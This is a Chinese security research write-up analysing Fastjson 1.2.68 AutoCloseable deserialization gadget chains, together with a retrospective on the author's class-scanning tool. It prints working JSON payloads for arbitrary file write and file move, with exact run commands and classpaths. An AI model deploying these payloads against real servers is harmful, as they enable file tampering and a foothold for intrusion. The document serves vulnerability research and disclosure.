@@ -1,0 +1,411 @@
+﻿标题: 寻找Fastjson 1.2.68 AutoCloseable利用链(2)
+
+创建: 2020-08-10 09:00
+更新: 2020-08-11 09:34
+链接: https://scz.617.cn/web/202008100900.txt
+
+--------------------------------------------------------------------------
+
+目录:
+
+    ☆ 前言
+    ☆ AutoCloseable_ant_solr_snappy.json
+    ☆ 浅蓝的原始PoC
+        1) AutoCloseable_movefile.json
+        2) AutoCloseable_writefile.json
+    ☆ 复盘
+        1) 为什么我忽略了"com.sleepycat.bind.serial.SerialOutput"
+        2) 为什么FindSomeClass3_mini.txt中没有ObjectOutputStream
+
+--------------------------------------------------------------------------
+
+☆ 前言
+
+文中涉及到的相关漏洞均为官方已经公开并修复的漏洞，涉及到的安全技术也仅用于
+企业安全建设和安全对抗研究。本文仅限业内技术研究与讨论，严禁用于非法用途，
+否则产生的一切后果自行承担。
+
+参看:
+
+《寻找Fastjson 1.2.68 AutoCloseable利用链》
+https://scz.617.cn/web/202008081723.txt
+
+本文针对rt.jar的潜在幺蛾子增补一些内容。早上意外看到浅蓝的原始PoC，学习之。
+
+☆ AutoCloseable_ant_solr_snappy.json
+
+第一个OutputStream不用rt.jar中的FileOutputStream，转用第三方库中的
+LazyFileOutputStream。FindSomeClass_mini.txt中有很多备选。
+
+--------------------------------------------------------------------------
+{
+    'stream':
+    {
+        '@type':"java.lang.AutoCloseable",
+        '@type':'org.apache.tools.ant.util.LazyFileOutputStream',
+        'file':'/tmp/nonexist',
+        'append':false
+    },
+    'writer':
+    {
+        '@type':"java.lang.AutoCloseable",
+        '@type':'org.apache.solr.common.util.FastOutputStream',
+        'tempBuffer':'SSBqdXN0IHdhbnQgdG8gcHJvdmUgdGhhdCBJIGNhbiBkbyBpdC4=',
+        'sink':
+        {
+            '$ref':'$.stream'
+        },
+        'start':38
+    },
+    'close':
+    {
+        '@type':"java.lang.AutoCloseable",
+        '@type':'org.iq80.snappy.SnappyOutputStream',
+        'out':
+        {
+            '$ref':'$.writer'
+        }
+    }
+}
+--------------------------------------------------------------------------
+
+java \
+-cp "fastjson-1.2.68.jar:ant-1.6.5.jar:solr-solrj-6.6.2.jar:snappy-0.3.jar:." \
+FastjsonDeserialize2 AutoCloseable_ant_solr_snappy.json
+
+☆ 浅蓝的原始PoC
+
+1) AutoCloseable_movefile.json
+
+--------------------------------------------------------------------------
+{
+    'stream':
+    {
+        '@type':"java.lang.AutoCloseable",
+        '@type':'org.eclipse.core.internal.localstore.SafeFileOutputStream',
+        'targetPath':'/tmp/dst',
+        'tempPath':'/tmp/src'
+    }
+}
+--------------------------------------------------------------------------
+
+假设src存在、dst不存在，PoC导致两个动作:
+
+a) mv src dst
+b) touch src
+
+如果不考虑动作b，这就是move文件，不是copy文件。即使考虑动作b，这也不是copy
+文件，源文件被清空，测试时务必提前意识到这点。
+
+不清楚原理时请严格按照如下步骤测试:
+
+echo -ne 'b1u3r' > /tmp/src
+rm /tmp/dst
+
+java \
+-cp "fastjson-1.2.68.jar:resources-3.3.0-v20070604.jar:." \
+FastjsonDeserialize2 AutoCloseable_movefile.json
+
+$ xxd -g 1 /tmp/src
+(无输出)
+
+$ xxd -g 1 /tmp/dst
+0000000: 62 31 75 33 72                                   b1u3r
+
+浅蓝用的jar包是:
+
+https://repo1.maven.org/maven2/org/aspectj/aspectjtools/1.9.5/aspectjtools-1.9.5.jar
+
+金超前的本地仓库中没有这个库，但有resources库，只是测试的话无所谓。
+
+2) AutoCloseable_writefile.json
+
+--------------------------------------------------------------------------
+{
+    'stream':
+    {
+        '@type':"java.lang.AutoCloseable",
+        '@type':'org.eclipse.core.internal.localstore.SafeFileOutputStream',
+        'targetPath':'/tmp/dst',
+        'tempPath':'/tmp/src'
+    },
+    'writer':
+    {
+        '@type':"java.lang.AutoCloseable",
+        '@type':'com.esotericsoftware.kryo.io.Output',
+        'buffer':'YjF1M3I=',
+        'outputStream':
+        {
+            '$ref':'$.stream'
+        },
+        'position':5
+    },
+    'close':
+    {
+        '@type':"java.lang.AutoCloseable",
+        '@type':'com.sleepycat.bind.serial.SerialOutput',
+        'out':
+        {
+            '$ref':'$.writer'
+        }
+    }
+}
+--------------------------------------------------------------------------
+
+第一个类无所谓，可选项很多。
+
+第二个类，我也曾用过"com.esotericsoftware.kryo.io.Output"。
+
+第三个类，我学艺不精，无视了ObjectOutputStream.class及其子孙类，导致较难找
+到与kryo适配的类，这事后面再说。
+
+这个PoC有些注意事项:
+
+a) 只要dst存在，PoC就会往src写数据，与src是否存在无关。
+b) dst不存在、src存在时，先"mv src dst"，再往src写数据。
+c) dst、src都不存在时才会往dst写数据。
+
+不清楚原理时请严格按照如下步骤测试:
+
+rm /tmp/src
+rm /tmp/dst
+
+java \
+-cp "fastjson-1.2.68.jar:resources-3.3.0-v20070604.jar:kryo-4.0.0.jar:je-5.0.73.jar:." \
+FastjsonDeserialize2 AutoCloseable_writefile.json
+
+$ xxd -g 1 /tmp/src
+xxd: /tmp/src: No such file or directory
+
+$ xxd -g 1 /tmp/dst
+0000000: 62 31 75 33 72                                   b1u3r
+
+☆ 复盘
+
+1) 为什么我忽略了"com.sleepycat.bind.serial.SerialOutput"
+
+FindSomeClass3_mini.txt中有:
+
+--------------------------------------------------------------------------
+X:\jar\repository\com\sleepycat\je\5.0.73\je-5.0.73.jar
+com.sleepycat.bind.serial.SerialOutput
+  public com.sleepycat.bind.serial.SerialOutput(java.io.OutputStream,com.sleepycat.bind.serial.ClassCatalog) throws java.io.IOException
+--------------------------------------------------------------------------
+
+浅蓝因为事先盯上ObjectOutputStream.class，有意识地去找其子孙类。但我并没有
+注意到SerialOutput.class，有两点被忽视了:
+
+--------------------------------------------------------------------------
+a)
+
+SerialOutput.<init>()会调ObjectOutputStream.<init>()
+
+b)
+
+Fastjson反序列化时，假设构造函数需要多个形参，而json只提供了其中一部分，则
+未提供的形参使用0、空串或null。
+--------------------------------------------------------------------------
+
+参看:
+
+--------------------------------------------------------------------------
+/*
+ * 1.2.68
+ *
+ * com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(DefaultJSONParser, Type, Object, Object, int, int[]) : Object
+ */
+protected <T> T deserialze(DefaultJSONParser parser, //
+                           Type type, //
+                           Object fieldName, //
+                           Object object, //
+                           int features, //
+                           int[] setFlags) {
+...
+/*
+ * 955行
+ */
+                FieldInfo[] fieldInfoList = beanInfo.fields;
+                int size = fieldInfoList.length;
+                params = new Object[size];
+                for (int i = 0; i < size; ++i) {
+                    FieldInfo fieldInfo = fieldInfoList[i];
+                    Object param = fieldValues.get(fieldInfo.name);
+/*
+ * 961行
+ */
+                    if (param == null) {
+                        Type fieldType = fieldInfo.fieldType;
+                        if (fieldType == byte.class) {
+                            param = (byte) 0;
+                        } else if (fieldType == short.class) {
+                            param = (short) 0;
+                        } else if (fieldType == int.class) {
+                            param = 0;
+                        } else if (fieldType == long.class) {
+                            param = 0L;
+                        } else if (fieldType == float.class) {
+                            param = 0F;
+                        } else if (fieldType == double.class) {
+                            param = 0D;
+                        } else if (fieldType == boolean.class) {
+                            param = Boolean.FALSE;
+                        } else if (fieldType == String.class
+                                && (fieldInfo.parserFeatures & Feature.InitStringFieldAsEmpty.mask) != 0) {
+                            param = "";
+                        }
+                    }
+                    params[i] = param;
+                }
+...
+/*
+ * 1012行，调用目标类构造函数
+ */
+                        object = beanInfo.creatorConstructor.newInstance(params);
+...
+}
+--------------------------------------------------------------------------
+
+之前用某种过滤规则的FindSomeClass3扫中过ObjectOutputStream.class，当时也去
+看过:
+
+java.io.ObjectOutputStream$BlockDataOutputStream(java.io.OutputStream)
+void java.io.ObjectOutputStream$BlockDataOutputStream.drain()
+
+不知何故将之放过？主要还是此道不精吧。更扯的是，不但没有盯上它，还莫名其妙
+有个错误结论，认为ObjectOutputStream的子孙类都不需要细看，于是进一步远离浅
+蓝的这条利用链。
+
+2) 为什么FindSomeClass3_mini.txt中没有ObjectOutputStream
+
+x64/RedHat 7.6+JDK 8u232
+x86/Debian 9+JDK 10.0.2
+
+    java -cp "fastjson-1.2.68.jar:." FindSomeClass3 <dir> | grep -B 1 -A 1 java.io.ObjectOutputStream
+
+x64/Win7+JDK 11.0.5
+
+    X:\Java\jdk-11.0.5\bin\java -cp "fastjson-1.2.68.jar;." FindSomeClass3 <dir> | findstr /C:"java.io.ObjectOutputStream"
+
+如上三种环境均可找到:
+
+public java.io.ObjectOutputStream(java.io.OutputStream) throws java.io.IOException
+
+x64/Win7+JDK 8u221
+
+    X:\Java\jdk1.8.0_221\bin\java -cp "fastjson-1.2.68.jar;." FindSomeClass3 <dir> | findstr /C:"java.io.ObjectOutputStream"
+
+如上环境无输出！
+
+为了减少干挠，所有目标rt.jar均为同一份rt_1.8.0_232.jar，源自RedHat，SHA1相
+同。这就比较诡异了，jar包完全一样，只是Java解释器版本不同，有的能找到目标类，
+有的却找不到。调试后发现幺蛾子出在ASMUtils.lookupParameterNames()中。
+
+--------------------------------------------------------------------------
+/*
+ * 1.2.68
+ *
+ * com.alibaba.fastjson.util.ASMUtils.lookupParameterNames(AccessibleObject) : String[]
+ */
+public static String[] lookupParameterNames(AccessibleObject methodOrCtor) {
+...
+/*
+ * 143行，"java.io.ObjectOutputStream"被最早那批ClassLoader加载过了，
+ * FindSomeClass3.java虽然用自己的URLClassLoader加载rt_1.8.0_232.jar，
+ * 但ASMUtils.lookupParameterNames()处理ObjectOutputStream.class时找到的是
+ * 最早那批ClassLoader。
+ */
+    ClassLoader classLoader = declaringClass.getClassLoader();
+    if (classLoader == null) {
+        classLoader = ClassLoader.getSystemClassLoader();
+    }
+
+    String className = declaringClass.getName();
+    String resourceName = className.replace('.', '/') + ".class";
+/*
+ * 150行，这个is里的jar包是当前Java进程JAVA_HOME中的rt.jar，对于
+ * "java.io.ObjectOutputStream"这种系统类来说，此处代码逻辑看不到我们指定
+ * 的rt_1.8.0_232.jar。按FindSomeClass3.java的代码逻辑，指定rt_1.8.0_232.jar
+ * 仅仅起到组织类名的作用。
+ */
+    InputStream is = classLoader.getResourceAsStream(resourceName);
+
+    if (is == null) {
+        return new String[0];
+    }
+
+    try {
+        ClassReader reader = new ClassReader(is, false);
+        TypeCollector visitor = new TypeCollector(name, types);
+        reader.accept(visitor);
+/*
+ * 160行，前述8u221的rt.jar不带调试信息，此处返回空数组String[0]
+ */
+        String[] parameterNames = visitor.getParameterNamesForMethod();
+
+        for (int i = 0; i < parameterNames.length; i++) {
+            Annotation[] annotations = parameterAnnotations[i];
+            if (annotations != null) {
+                for (int j = 0; j < annotations.length; j++) {
+                    if (annotations[j] instanceof JSONField) {
+                        JSONField jsonField = (JSONField) annotations[j];
+                        String fieldName = jsonField.name();
+                        if (fieldName != null && fieldName.length() > 0) {
+                            parameterNames[i] = fieldName;
+                        }
+                    }
+                }
+            }
+        }
+
+        return parameterNames;
+    } catch (IOException e) {
+        return new String[0];
+    } finally {
+        IOUtils.close(is);
+    }
+}
+--------------------------------------------------------------------------
+
+回头来看，不算ASMUtils.lookupParameterNames()的幺蛾子，是FindSomeClass3代
+码逻辑带来的误会。
+
+实现FindSomeClass3.java时尝试过各种取形参名字的办法，比如:
+
+--------------------------------------------------------------------------
+a)
+
+javac -parameters
+
+这个从Java 8开始支持，但要求编译时就指定，对已存在的jar包无用。
+
+b)
+
+com.sun.org.apache.bcel.internal.classfile.ClassParser
+
+调用getLocalVariable()，本质上是读取"javac -g"留下的调试信息，这就看目标
+jar是否保存调试信息了。
+
+c)
+
+paranamer-2.8.jar
+
+这是个第三方库，封装现有技术便于使用而已，没有本质突破。
+
+d)
+
+ASMUtils.lookupParameterNames()
+
+就FindSomeClass3.java原始目的而言，还不如直接调它算了。
+--------------------------------------------------------------------------
+
+由于setter的存在，理论上并不要求目标jar包必须保存调试信息。Fastjson处理
+setter的代码逻辑不依赖形参名字，FindSomeClass3.java中的FilterSetter()没有
+调用ASMUtils.lookupParameterNames()。但合适的setter比合适的构造函数少多了。
+
+rt.jar是否保存调试信息是目标环境强相关的，第三方库更是很难有个固定说法，所
+以写FindSomeClass3.java愣搜，减少人工工作量。
+
+如果没有仔细从头看下来，给懒人说个简单结论，在目标环境中执行FindSomeClass3，
+如果它"没有"输出某个类，那该类就不能用于该目标环境，这是个必要非充分条件。
+再强调一下，FindSomeClass3.java是示例性框架，读懂代码逻辑，根据不同需求自
+行调整过滤规则。
